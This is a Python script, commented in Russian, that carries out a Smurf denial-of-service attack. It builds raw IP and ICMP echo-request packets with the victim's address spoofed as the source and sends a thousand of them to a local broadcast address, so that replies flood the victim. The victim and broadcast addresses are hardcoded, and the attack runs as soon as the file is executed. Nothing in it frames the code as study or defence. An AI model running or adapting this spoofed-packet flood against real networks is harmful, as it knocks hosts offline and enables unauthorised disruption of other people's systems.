import socket
import struct
import time

ICMP_ECHO_REQUEST = 8


def calculate_checksum(source_string):
    count_to = (len(source_string) // 2) * 2
    checksum = 0
    count = 0

    while count < count_to:
        this_val = source_string[count + 1] * 256 + source_string[count]
        checksum = checksum + this_val
        checksum = checksum & 0xffffffff
        count = count + 2

    if count_to < len(source_string):
        checksum = checksum + source_string[len(source_string) - 1]
        checksum = checksum & 0xffffffff

    checksum = (checksum >> 16) + (checksum & 0xffff)
    checksum = checksum + (checksum >> 16)
    answer = ~checksum
    answer = answer & 0xffff
    answer = answer >> 8 | (answer << 8 & 0xff00)

    return answer


def create_icmp_packet():
    icmp_header = struct.pack('bbHHh', ICMP_ECHO_REQUEST, 0, 0, 1, 1)
    data = struct.pack('d', time.time())

    checksum = calculate_checksum(icmp_header + data)
    icmp_header = struct.pack('bbHHh', ICMP_ECHO_REQUEST, 0, socket.htons(checksum), 1, 1)

    return icmp_header + data


def create_ip_header(source_ip, dest_ip):
    version_ihl = (4 << 4) + 5  # Version 4, IHL 5
    tos = 0
    total_length = 20 + 8  # IP header + ICMP packet
    ip_id = 54321  # ID of this packet
    fragment_offset = 0
    ttl = 255  # Time to live
    protocol = socket.IPPROTO_ICMP
    checksum = 0

    src_ip = socket.inet_aton(source_ip)
    dst_ip = socket.inet_aton(dest_ip)

    ip_header = struct.pack('!BBHHHBBH4s4s', version_ihl, tos, total_length, ip_id, fragment_offset,
                            ttl, protocol, checksum, src_ip, dst_ip)

    ip_checksum = calculate_checksum(ip_header)
    ip_header = struct.pack('!BBHHHBBH4s4s', version_ihl, tos, total_length, ip_id, fragment_offset,
                            ttl, protocol, socket.htons(ip_checksum), src_ip, dst_ip)

    return ip_header


def send_smurf_attack(broadcast_ip, victim_ip):
    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)

    # Устанавливаем флаг IP_HDRINCL, чтобы включить IP-заголовок
    sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

    for i in range(1000):

        ip_header = create_ip_header(victim_ip, broadcast_ip)
        icmp_packet = create_icmp_packet()

        packet = ip_header + icmp_packet

        # Отправляем пакет на широковещательный адрес
        sock.sendto(packet, (broadcast_ip, 0))

        print(f"Smurf attack on {victim_ip} via {broadcast_ip}")

        time.sleep(0.01)


broadcast_ip = "192.168.0.255"  # Широковещательный адрес сети
victim_ip = "192.168.0.156"  # IP жертвы

send_smurf_attack(broadcast_ip, victim_ip)
